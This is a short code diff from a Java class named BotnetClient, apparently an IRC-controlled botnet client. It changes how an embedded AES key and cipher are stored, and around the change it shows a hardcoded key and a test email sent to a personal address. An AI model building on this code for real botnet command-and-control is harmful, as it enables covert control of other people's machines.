@@ -37,8 +37,8 @@ public class BotnetClient extends PircBot {
 	(byte)0xee, (byte)0x80, (byte)032, (byte)0x9d, (byte)0xb8, (byte)0xb1, (byte)0x47, 
 	(byte)0x65, (byte)0xa1, (byte)0xd0, (byte)0x01};
 
-	private SecretKeySpec startKey;
-	private Cipher startCipher;
+	private Key startKey;
+	//private Cipher startCipher;
 	private MsgEncrypt startMsgE;
 	
 	private Key privKey;
@@ -59,8 +59,8 @@ public class BotnetClient extends PircBot {
 			sendEmail("shakalandro@gmail.com", new String[] {"shakalandro@gmail.com"}, "works", "sweetness");
 			
 			startKey = new SecretKeySpec(key, "AES");
-			startCipher = Cipher.getInstance("AES");
-			startCipher.init(Cipher.DECRYPT_MODE, startKey);
+			//startCipher = Cipher.getInstance("AES");
+			//startCipher.init(Cipher.DECRYPT_MODE, startKey);
 			startMsgE = MsgEncrypt.getInstance(startKey);
 		} catch (NickAlreadyInUseException e) {
 			uuid = UUID.randomUUID().toString();
